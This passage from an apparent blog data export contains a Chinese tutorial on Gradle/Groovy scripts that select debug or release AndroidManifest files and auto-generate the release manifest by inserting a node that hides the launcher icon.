comp.each { filter ->\n                    // 搜索入口Activity\n                    if (filter.toString().contains('android.intent.category.LAUNCHER')) {\n                        // 添加data节点，隐藏桌面icon\n                        filter.appendNode('data', ['android:host': 'localhost', 'android:scheme': '${applicationId}'])\n                        return true // break each闭包\n                    }\n                }\n            }\n        }\n        releaseFile.write(XmlUtil.serialize(debugXml))\n    }\n}\n\nandroid {\n    defaultConfig {\n        applicationId \"com.xxx.xxx\"\n    }\n    sourceSets {\n        main {\n            // 此处会自动处理manifest文件\n            // 注意：平时开发时只需修改debug下的manifest即可，请勿手动修改release的\n            handleManifestXml(manifest)\n        }\n    }\n...\n```\n\n关键逻辑从 `def debugXml = new XmlParser(false, false).parse(debugFile)` 开始，这里的XmlParser构造方法可以不传任何参数，我这里传false主要是为了让manifest根节点自动添加 **xmlns** ，这样最后生成文件内容会简洁一点。\n\n然后就是 `debugXml.application[0].each { comp -> ... } ` 循环块，Groovy的语法很神奇，这里可以直接通过节点名称来获取数组，比如application，取0当然就是第一个，一般我们的manifest里就一个application节点，所以也不会出现空指针异常。each是数组的函数，遍历数组的每一个节点，comp参数是我自定义的命名。能拿到application的子节点，后面就都是一些逻辑处理了，不赘述。\n\n## 一些小问题\n\n如果是Windows开发者，最后写文件时，需要注意换行符和编码的问题。\n\n1、最后的write方法，加上参数：\n\n```groovy\nreleaseFile.write(xmlStr, \"UTF-8\")\n```\n\n或者直接改全局配置，修改整个工程下的gradle.properties文件，在gradle的JVM参数后面追加如下：\n\n```\norg.gradle.jvmargs=-Xmx2048m -Dfile.encoding=UTF-8\n```\n\n2、换行符问题，没有JVM参数可供修改，只能手动处理，还是最后write时：\n\n```groovy\nreleaseFile.write(XmlUtil.serialize(debugXml).replaceAll('\\r\\n', '\\n'))\n```\n\n这里XmlUtil工具类的serialize方法返回类型实际上就是String，所以可以这样直接replace。\n","slug":"用Gradle脚本管理Manifest文件","published":1,"updated":"2024-03-25T07:31:25.862Z","comments":1,"photos":[],"link":"","_id":"cluaufh11002othe6e32fd3an","content":"<h2 id=\"编译时区分不同的manifest\"><a href=\"#编译时区分不同的manifest\" class=\"headerlink\" title=\"编译时区分不同的manifest\"></a>编译时区分不同的manifest</h2><p>很多Android项目都会区分debug和release的manifest文件，以便调试，一些组件化的项目甚至有多个manifest文件来调试不同的组件。举个简单的例子，在app的build.gradle文件中：</p>\n<figure class=\"highlight groovy\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">android &#123;</span><br><span class=\"line\">    defaultConfig &#123;</span><br><span class=\"line\">        applicationId <span class=\"string\">&quot;com.xxx.xxx&quot;</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    sourceSets &#123;</span><br><span class=\"line\">        main &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span>(是否为debug打包) &#123;</span><br><span class=\"line\">                manifest.srcFile <span class=\"string\">&quot;$&#123;projectDir&#125;/src/main/debug/AndroidManifest.xml&quot;</span></span><br><span class=\"line\">            &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                manifest.srcFile <span class=\"string\">&quot;$&#123;projectDir&#125;/src/main/release/AndroidManifest.xml&quot;</span></span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>这个地方的if条件，一般可以是一个变量，或者一个方法：</p>\n<figure class=\"highlight groovy\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 这样</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> isDebug = <span class=\"literal\">true</span></span><br><span class=\"line\"><span class=\"comment\">// 或者</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> isDebug() &#123;</span><br><span class=\"line\">    <span class=\"comment\">// 一些逻辑</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">true</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">// 以上均遵循Groovy语法规则，Android项目中的Gradle脚本都是用Groovy语言（一门JVM动态语言，很容易上手）编写的。</span></span><br><span class=\"line\">android &#123; ... &#125;</span><br></pre></td></tr></table></figure>\n\n<p>然后此处的 ${projectDir} 变量对应的是当前模块所在的路径，这里就是app的路径，不是整个工程的路径。这样一来，我们就能编译不同的manifest文件了。</p>\n<h2 id=\"自动判断编译类型\"><a href=\"#自动判断编译类型\" class=\"headerlink\" title=\"自动判断编译类型\"></a>自动判断编译类型</h2><p>但是，这样每次编译都需要手动改那个debug变量，挺麻烦的，尤其是一些技术团队可能是用的公司服务器在线编译，每次都要提交代码到仓库。其实我们可以用gradle插件的特性，这样来判断：</p>\n<figure class=\"highlight groovy\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 这里app是当前模块名，assembleDebug是gradle编译debug包时的默认task</span></span><br><span class=\"line\"><span class=\"keyword\">if</span>(gradle.startParameter.taskNames.contains(<span class=\"string\">&quot;:app:assembleDebug&quot;</span>)) &#123;</span><br><span class=\"line\">    manifest.srcFile <span class=\"string\">&quot;$&#123;projectDir&#125;/src/main/debug/AndroidManifest.xml&quot;</span></span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    manifest.srcFile <span class=\"string\">&quot;$&#123;projectDir&#125;/src/main/release/AndroidManifest.xml&quot;</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>不用改代码，打release包和debug包就自动区分了，当然你也可以增加新的条件，去对应不同的编译task。</p>\n<h2 id=\"解析并自动生成manifest文件\"><a href=\"#解析并自动生成manifest文件\" class=\"headerlink\" title=\"解析并自动生成manifest文件\"></a>解析并自动生成manifest文件</h2><p>这部分是本文重点啦！从上面的步骤来看，我们显然是准备了2份manifest文件，平时维护时也需要一起修改。实际业务中很可能debug和release的manifest内容差不多，可能只是某些组件节点的属性不同，手动改也挺麻烦的。</p>\n<p>能不能通过gradle脚本动态地来修改并生成manifest文件呢？当然可以，本质上就是处理XML文件。AndroidManifest是标准的XML文件。正好，Groovy处理XML又非常的简单。这里我们还是以一个实际例子来讲。</p>\n<p>比如我们的需求是，在debug测试时，应用正常显示桌面图标，在release发布时，应用需要隐藏图标。那么，两个manifest文件就是这样的：</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?xml version=<span class=\"string\">&quot;1.0&quot;</span> encoding=<span class=\"string\">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">manifest</span> <span class=\"attr\">...</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">application</span> <span class=\"attr\">...</span>&gt;</span></span><br><span class=\"line\">        <span class=\"comment\">&lt;!--App入口页面--&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">activity</span></span></span><br><span class=\"line\"><span class=\"tag\">            <span class=\"attr\">...</span></span></span><br><span class=\"line\"><span class=\"tag\">            <span class=\"attr\">android:name</span>=<span class=\"string\">&quot;.TestActivity&quot;</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">intent-filter</span>&gt;</span></span><br><span class=\"line\">                <span class=\"tag\">&lt;<span class=\"name\">action</span> <span class=\"attr\">android:name</span>=<span class=\"string\">&quot;android.intent.action.MAIN&quot;</span> /&gt;</span></span><br><span class=\"line\">                <span class=\"tag\">&lt;<span class=\"name\">category</span> <span class=\"attr\">android:name</span>=<span class=\"string\">&quot;android.intent.category.LAUNCHER&quot;</span> /&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;/<span class=\"name\">intent-filter</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">activity</span>&gt;</span></span><br><span class=\"line\">...</span><br></pre></td></tr></table></figure>\n\n<p>release版本的manifest：</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?xml version=<span class=\"string\">&quot;1.0&quot;</span> encoding=<span class=\"string\">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">manifest</span> <span class=\"attr\">...</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">application</span> <span class=\"attr\">...</span>&gt;</span></span><br><span class=\"line\">        <span class=\"comment\">&lt;!--App入口页面--&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">activity</span></span></span><br><span class=\"line\"><span class=\"tag\">            <span class=\"attr\">...</span></span></span><br><span class=\"line\"><span class=\"tag\">            <span class=\"attr\">android:name</span>=<span class=\"string\">&quot;.TestActivity&quot;</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">intent-filter</span>&gt;</span></span><br><span class=\"line\">                <span class=\"tag\">&lt;<span class=\"name\">action</span> <span class=\"attr\">android:name</span>=<span class=\"string\">&quot;android.intent.action.MAIN&quot;</span> /&gt;</span></span><br><span class=\"line\">                <span class=\"tag\">&lt;<span class=\"name\">category</span> <span class=\"attr\">android:name</span>=<span class=\"string\">&quot;android.intent.category.LAUNCHER&quot;</span> /&gt;</span></span><br><span class=\"line\">                <span class=\"comment\">&lt;!--在入口Activity添加如下data节点即可隐藏桌面图标--&gt;</span></span><br><span class=\"line\">                <span class=\"tag\">&lt;<span class=\"name\">data</span> </span></span><br><span class=\"line\"><span class=\"tag\">                    <span class=\"attr\">android:host</span>=<span class=\"string\">&quot;localhost&quot;</span> </span></span><br><span class=\"line\"><span class=\"tag\">                    <span class=\"attr\">android:scheme</span>=<span class=\"string\">&quot;$&#123;applicationId&#125;&quot;</span> /&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;/<span class=\"name\">intent-filter</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">activity</span>&gt;</span></span><br><span class=\"line\">...</span><br></pre></td></tr></table></figure>\n\n<p>然后平时我们开发过程中，如果新增了一些四大组件，2个文件都要同时增加，而区别却只有入口Activity。我们想要的是release版本的manifest是自动生成的（在生成时插入那个data节点），平时只需要开发改动debug版本的文件即可。</p>\n<p>主要思路比较简单：</p>\n<ol>\n<li>通过Groovy的XML解析库读取debug的manifest文件，遍历节点找到入口Activity；</li>\n<li>将data节点插入到入口Activity下面；</li>\n<li>把新的内容写入release版本的文件当中。</li>\n</ol>\n<p>先直接看build.gradle脚本源码：</p>\n<figure class=\"highlight groovy\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> groovy.xml.XmlUtil</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> getManifestPath(buildType) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"string\">&quot;$&#123;projectDir&#125;/src/main/$buildType/AndroidManifest.xml&quot;</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> handleManifestXml(manifest) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (gradle.startParameter.taskNames.contains(<span class=\"string\">&quot;:app:assembleDebug&quot;</span>)) &#123;</span><br><span class=\"line\">        <span class=\"comment\">// debug build</span></span><br><span class=\"line\">        <span class=\"keyword\">def</span> debugPath = getManifestPath(<span class=\"string\">&#x27;debug&#x27;</span>)</span><br><span class=\"line\">        manifest.srcFile debugPath</span><br><span class=\"line\">        println(<span class=\"string\">&quot;Manifest path: $debugPath&quot;</span>)</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"comment\">// release build</span></span><br><span class=\"line\">        <span class=\"keyword\">def</span> releasePath = getManifestPath(<span class=\"string\">&#x27;release&#x27;</span>)</span><br><span class=\"line\">        println(<span class=\"string\">&quot;Manifest path: $releasePath&quot;</span>)</span><br><span class=\"line\">        manifest.srcFile releasePath</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">def</span> debugPath = getManifestPath(<span class=\"string\">&#x27;debug&#x27;</span>)</span><br><span class=\"line\">        <span class=\"keyword\">def</span> debugFile = <span class=\"keyword\">new</span> File(debugPath)</span><br><span class=\"line\">        <span class=\"keyword\">def</span> releaseFile = <span class=\"keyword\">new</span> File(releasePath)</span><br><span class=\"line\">        <span class=\"keyword\">def</span> debugXml = <span class=\"keyword\">new</span> XmlParser(<span class=\"literal\">false</span>, <span class=\"literal\">false</span>).parse(debugFile)</span><br><span class=\"line\">        <span class=\"comment\">// 修改debug的manifest，自动生成release版本</span></span><br><span class=\"line\">        debugXml.application[<span class=\"number\">0</span>].each &#123; comp -&gt;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (comp.name() == <span class=\"string\">&#x27;activity&#x27;</span>) &#123;</span><br><span class=\"line\">                comp.each &#123; filter -&gt;</span><br><span class=\"line\">                    <span class=\"comment\">// 搜索入口Activity</span></span><br><span class=\"line\">                    <span class=\"keyword\">if</span> (filter.toString().contains(<span class=\"string\">&#x27;android.intent.category.LAUNCHER&#x27;</span>)) &#123;</span><br><span class=\"line\">                        <span class=\"comment\">// 添加data节点，隐藏桌面icon</span></span><br><span class=\"line\">                        filter.appendNode(<span class=\"string\">&#x27;data&#x27;</span>, [<span class=\"string\">&#x27;android:host&#x27;</span>: <span class=\"string\">&#x27;localhost&#x27;</span>, <span class=\"string\">&#x27;android:scheme&#x27;</span>: <span class=\"string\">&#x27;$&#123;applicationId&#125;&#x27;</span>])</span><br><span class=\"line\">                        <span class=\"keyword\">return</span> <span class=\"literal\">true</span> <span class=\"comment\">// break each闭包</span></span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        releaseFile.write(XmlUtil.serialize(debugXml))</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">android &#123;</span><br><span class=\"line\">    defaultConfig &#123;</span><br><span class=\"line\">        applicationId <span class=\"string\">&quot;com.xxx.xxx&quot;</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    sourceSets &#123;</span><br><span class=\"line\">        main &#123;</span><br><span class=\"line\">            <span class=\"comment\">// 此处会自动处理manifest文件</span></span><br><span class=\"line\">            <span class=\"comment\">// 注意：平时开发时只需修改debug下的manifest即可，请勿手动修改release的</span></span><br><span class=\"line\">            handleManifestXml(manifest)</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">...</span><br></pre></td></tr></table></figure>\n\n<p>关键逻辑从 <code>def debugXml = new XmlParser(false, false).parse(debugFile)</code> 开始，这里的XmlParser构造方法可以不传任何参数，我这里传false主要是为了让manifest根节点自动添加 <strong>xmlns</strong> ，这样最后生成文件内容会简洁一点。</p>\n<p>然后就是 <code>debugXml.application[0].each &#123; comp -&gt; ... &#125; </code> 循环块，Groovy的语法很神奇，这里可以直接通过节点名称来获取数组，比如application，取0当然就是第一个，一般我们的manifest里就一个application节点，所以也不会出现空指针异常。each是数组的函数，遍历数组的每一个节点，comp参数是我自定义的命名。能拿到application的子节点，后面就都是一些逻辑处理了，不赘述。</p>\n<h2 id=\"一些小问题\"><a href=\"#一些小问题\" class=\"headerlink\" title=\"一些小问题\"></a>一些小问题</h2><p>如果是Windows开发者，最后写文件时，需要注意换行符和编码的问题。</p>\n<p>1、最后的write方法，加上参数：</p>\n<figure class=\"highlight groovy\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">releaseFile.write(xmlStr, <span class=\"string\">&quot;UTF-8&quot;</span>)</span><br></pre></td></tr></table></figure>\n\n<p>或者直接改全局配置，修改整个工程下的gradle.properties文件，在gradle的JVM参数后面追加如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">org.gradle.jvmargs=-Xmx2048m -Dfile.encoding=UTF-8</span><br></pre></td></tr></table></figure>\n\n<p>2、换行符问题，没有JVM参数可供修改，只能手动处理，还是最后write时：</p>\n<figure class=\"highlight groovy\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">releaseFile.write(XmlUtil.serialize(debugXml).replaceAll(<span class=\"string\">&#x27;\\r\\n&#x27;</span>, <span class=\"string\">&#x27;\\n&#x27;</span>))</span><br></pre></td></tr></table></figure>\n\n<p>这里XmlUtil工具类的serialize方法返回类型实际上就是String，所以可以这样直接replace。</p>\n","site":{"data":{"widget":{"top":[{"class_name":"donate","id_name":"donate","name":"随缘支持","icon":"fas fa-heartbeat","html":"<p style=\"text-align:center;padding:0;margin:0;\"><a href=\"https://qr.alipay.com/fkx12362diu95oh2aweaac5\"><img src=\"https://blog.ysy950803.top/img/love-support.png\" width=\"200\" height=\"200\"/></a></p> <p style=\"text-align:center;padding:0;margin:0;\">移动端点击二维码亦可</p> <p style=\"text-align:center;padding:0;margin:0;\"><u><a href=\"https://paypal.me/yaoshengyu\">Paypal.me if you like</a></u></p>"}]}}},"cover":false,"excerpt":"","more":"<h2 id=\"编译时区分不同的manifest\"><a href=\"#编译时区分不同的manifest\" class=\"headerlink\" title=\"编译时区分不同的manifest\"></a>编译时区分不同的manifest</h2><p>很多Android项目都会区分debug和release的manifest文件，以便调试，一些组件化的项目甚至有多个manifest文件来调试不同的组件。举个简单的例子，在app的build.gradle文件中：</p>\n<figure class=\"highlight groovy\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">android &#123;</span><br><span class=\"line\">    defaultConfig &#123;</span><br><span class=\"line\">        applicationId <span class=\"string\">&quot;com.xxx.xxx&quot;</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    sourceSets &#123;</span><br><span class=\"line\">        main &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span>(是否为debug打包) &#123;</span><br><span class=\"line\">                manifest.srcFile <span class=\"string\">&quot;$&#123;projectDir&#125;/src/main/debug/AndroidManifest.xml&quot;</span></span><br><span class=\"line\">            &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                manifest.srcFile <span class=\"string\">&quot;$&#123;projectDir&#125;/src/main/release/AndroidManifest.xml&quot;</span></span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>这个地方的if条件，一般可以是一个变量，或者一个方法：</p>\n<figure class=\"highlight groovy\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 这样</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> isDebug = <span class=\"literal\">true</span></span><br><span class=\"line\"><span class=\"comment\">// 或者</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> isDebug() &#123;</span><br><span class=\"line\">    <span class=\"comment\">// 一些逻辑</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">true</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">// 以上均遵循Groovy语法规则，Android项目中的Gradle脚本都是用Groovy语言（一门JVM动态语言，很容易上手）编写的。</span></span><br><span class=\"line\">android &#123; ... &#125;</span><br></pre></td></tr></table></figure>\n\n<p>然后此处的 ${projectDir} 变量对应的是当前模块所在的路径，这里就是app的路径，不是整个工程的路径。这样一来，我们就能编译不同的manifest文件了。</p>\n<h2 id=\"自动判断编译类型\"><a href=\"#自动判断编译类型\" class=\"headerlink\" title=\"自动判断编译类型\"></a>自动判断编译类型</h2><p>但是，这样每次编译都需要手动改那个debug变量，挺麻烦的，尤其是一些技术团队可能是用的公司服务器在线编译，每次都要提交代码到仓库。其实我们可以用gradle插件的特性，这样来判断：</p>\n<figure class=\"highlight groovy\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 这里app是当前模块名，assembleDebug是gradle编译debug包时的默认task</span></span><br><span class=\"line\"><span class=\"keyword\">if</span>(gradle.startParameter.taskNames.contains(<span class=\"string\">&quot;:app:assembleDebug&quot;</span>)) &#123;</span><br><span class=\"line\">    manifest.srcFile <span class=\"string\">&quot;$&#123;projectDir&#125;/src/main/debug/AndroidManifest.xml&quot;</span></span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    manifest.srcFile <span class=\"string\">&quot;$&#123;projectDir&#125;/src/main/release/AndroidManifest.xml&quot;</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>不用改代码，打release包和debug包就自动区分了，当然你也可以增加新的条件，去对应不同的编译task。</p>\n<h2 id=\"解析并自动生成manifest文件\"><a href=\"#解析并自动生成manifest文件\" class=\"headerlink\" title=\"解析并自动生成manifest文件\"></a>解析并自动生成manifest文件</h2><p>这部分是本文重点啦！从上面的步骤来看，我们显然是准备了2份manifest文件，平时维护时也需要一起修改。实际业务中很可能debug和release的manifest内容差不多，可能只是某些组件节点的属性不同，手动改也挺麻烦的。</p>\n<p>能不能通过gradle脚本动态地来修改并生成manifest文件呢？当然可以，本质上就是处理XML文件。AndroidManifest是标准的XML文件。正好，Groovy处理XML又非常的简单。这里我们还是以一个实际例子来讲。</p>\n<p>比如我们的需求是，在debug测试时，应用正常显示桌面图标，在release发布时，应用需要隐藏图标。那么，两个manifest文件就是这样的：</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?xml version=<span class=\"string\">&quot;1.0&quot;</span> encoding=<span class=\"string\">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">manifest</span> <span class=\"attr\">...</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">application</span> <span class=\"attr\">...</span>&gt;</span></span><br><span class=\"line\">        <span class=\"comment\">&lt;!--App入口页面--&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">activity</span></span></span><br><span class=\"line\"><span class=\"tag\">            <span class=\"attr\">...</span></span></span><br><span class=\"line\"><span class=\"tag\">            <span class=\"attr\">android:name</span>=<span class=\"string\">&quot;.TestActivity&quot;</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">intent-filter</span>&gt;</span></span><br><span class=\"line\">                <span class=\"tag\">&lt;<span class=\"name\">action</span> <span class=\"attr\">android:name</span>=<span class=\"string\">&quot;android.intent.action.MAIN&quot;</span> /&gt;</span></span><br><span class=\"line\">                <span class=\"tag\">&lt;<span class=\"name\">category</span> <span class=\"attr\">android:name</span>=<span class=\"string\">&quot;android.intent.category.LAUNCHER&quot;</span> /&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;/<span class=\"name\">intent-filter</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">activity</span>&gt;</span></span><br><span class=\"line\">...</span><br></pre></td></tr></table></figure>\n\n<p>release版本的manifest：</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?xml version=<span class=\"string\">&quot;1.0&quot;</span> encoding=<span class=\"string\">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">manifest</span> <span class=\"attr\">...</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">application</span> <span class=\"attr\">...</span>&gt;</span></span><br><span class=\"line\">        <span class=\"comment\">&lt;!--App入口页面--&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">activity</span></span></span><br><span class=\"line\"><span class=\"tag\">            <span class=\"attr\">...</span></span></span><br><span class=\"line\"><span class=\"tag\">            <span class=\"attr\">android:name</span>=<span class=\"string\">&quot;.TestActivity&quot;</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">intent-filter</span>&gt;</span></span><br><span class=\"line\">                <span class=\"tag\">&lt;<span class=\"name\">action</span> <span class=\"attr\">android:name</span>=<span class=\"string\">&quot;android.intent.action.MAIN&quot;</span> /&gt;</span></span><br><span class=\"line\">                <span class=\"tag\">&lt;<span class=\"name\">category</span> <span class=\"attr\">android:name</span>=<span class=\"string\">&quot;android.intent.category.LAUNCHER&quot;</span> /&gt;</span></span><br><span class=\"line\">                <span 